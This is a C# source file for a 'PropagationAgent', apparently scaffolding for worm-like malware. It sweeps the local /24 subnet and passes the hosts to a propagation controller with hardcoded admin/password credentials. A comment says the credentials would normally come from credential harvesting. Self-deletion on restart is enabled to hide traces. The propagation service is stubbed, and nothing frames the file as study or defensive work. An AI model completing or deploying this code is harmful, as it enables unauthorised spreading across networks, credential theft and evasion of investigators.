using AetherSec.Agent.Propagation;
using System;
using System.Collections.Generic;
using System.Net;
using System.Threading.Tasks;

namespace AetherSec.Agent.Propagation
{
	public class PropagationAgent : IAgent
	{
		public string HostId { get; private set; } = Guid.NewGuid().ToString();
		public string CurrentIp { get; private set; }

		private readonly PropagationController controller;

		public PropagationAgent()
		{
			// Setup default config
			var config = new PropagationConfig
			{
				WhitelistedSubnets = new List<string> { "192.168.1.", "10.0.0." },
				BlacklistedHosts = new List<string> { "192.168.1.1" },
				EnablePropagation = true,
				MaxConcurrentPropagations = 3,
				SelfDeleteOnRestart = true
			};

			// Inject default (stubbed) propagation service
			var service = new PropagationService(); // You’ll define this separately
			controller = new PropagationController(config, service);
		}

		public async Task StartAsync()
		{
			Console.WriteLine("[*] Agent initialized.");
			CurrentIp = GetLocalIp();
			await ScanAndPropagateAsync();
		}

		public async Task ScanAndPropagateAsync()
		{
			Console.WriteLine("[*] Scanning local subnet...");

			var discoveredHosts = DiscoverLocalHosts(CurrentIp);
			Console.WriteLine($"[*] Found {discoveredHosts.Count} potential hosts.");

			// These would normally come from credential harvesting or input
			string username = "admin";
			string password = "password";

			await controller.RunPropagationAsync(discoveredHosts, username, password);
		}

		public async Task ReportFindingsAsync()
		{
			Console.WriteLine("[*] Reporting findings...");
			await Task.CompletedTask;
		}

		private string GetLocalIp()
		{
			try
			{
				string ip = Dns.GetHostAddresses(Dns.GetHostName())[0].ToString();
				return ip;
			}
			catch
			{
				return "Unknown";
			}
		}

		private List<string> DiscoverLocalHosts(string localIp)
		{
			// Very basic ping sweep simulation on a /24 subnet
			var hosts = new List<string>();
			if (IPAddress.TryParse(localIp, out var baseIp))
			{
				var parts = localIp.Split('.');
				string subnet = $"{parts[0]}.{parts[1]}.{parts[2]}";

				for (int i = 1; i <= 254; i++)
				{
					string ip = $"{subnet}.{i}";
					if (ip != localIp)
						hosts.Add(ip);
				}
			}

			return hosts;
		}
	}
}
